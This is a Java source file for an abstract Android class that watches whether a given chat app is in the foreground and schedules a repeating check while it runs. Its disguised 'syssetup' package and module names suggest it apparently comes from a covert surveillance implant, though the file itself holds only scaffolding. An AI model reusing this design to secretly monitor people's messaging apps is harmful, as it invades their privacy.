package com.android.syssetup.module.chat;

import java.util.concurrent.ScheduledFuture;
import java.util.concurrent.TimeUnit;

import com.android.syssetup.ProcessInfo;
import com.android.syssetup.ProcessStatus;
import com.android.syssetup.RunningProcesses;
import com.android.syssetup.Standby;
import com.android.syssetup.Status;
import com.android.syssetup.auto.Cfg;
import com.android.syssetup.interfaces.Observer;
import com.android.syssetup.listener.ListenerStandby;
import com.android.syssetup.module.ModuleChat;
import com.android.syssetup.module.SubModule;
import com.android.syssetup.util.Check;

public abstract class SubModuleChat extends SubModule implements Observer<Standby> {

	private static final String TAG = "SubModuleChat";
	private ScheduledFuture future;
	RunningProcesses runningProcesses = RunningProcesses.self();

	@Override
	protected void go() {

	}

	@Override
	protected void start() {

	}

	@Override
	protected void stop() {

	}
	
	@Override	
	protected void startListen() {
		ListenerStandby.self().attach(this);
	}
	
	@Override
	protected void stopListen() {
		ListenerStandby.self().detach(this);
	}

	@Override
	public int notification(Standby b) {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (notification) standby " + b);
		}
		if (b.getStatus() == false) {
			ProcessInfo process = new ProcessInfo(runningProcesses.getForeground_wrapper(), ProcessStatus.STOP);
			notification(process);
		} else {
			ProcessInfo process = new ProcessInfo(runningProcesses.getForeground_wrapper(), ProcessStatus.START);
			notification(process);
		}
		return 0;
	}

	@Override
	public int notification(ProcessInfo process) {

		if (process.processInfo.contains(getObservingProgram())) {
			if (process.status == ProcessStatus.STOP) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (notification), observing found: " + process.processInfo);
				}
				if (future != null) {
					future.cancel(false);
				}
				notifyStopProgram(process.processInfo);

				return 1;
			} else {
				if (frequentNotification(process.processInfo)) {
					Runnable runnable = getFrequentRunnable(process.processInfo);
					if (runnable != null) {
						future = Status.getStpe().scheduleAtFixedRate(runnable, 0, Cfg.FREQUENT_NOTIFICATION_PERIOD, TimeUnit.SECONDS);

					}
					return 1;
				}
			}
		}
		return 0;
	}

	private Runnable getFrequentRunnable(final String processInfo) {
		return new Runnable() {

			@Override
			public void run() {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (run) call frequentNotification " + processInfo);
				}
				if (!frequentNotification(processInfo) && future != null) {
					if (Cfg.DEBUG) {
						Check.log(TAG + " (run) kill stpe");

						future.cancel(false);
					}
				}

			}
		};
	}

	protected boolean frequentNotification(String processInfo) {
		return false;
	}

	protected ModuleChat getModule() {
		return (ModuleChat) module;
	}

	abstract void notifyStopProgram(String processName);

	abstract int getProgramId();

	abstract String getObservingProgram();
}
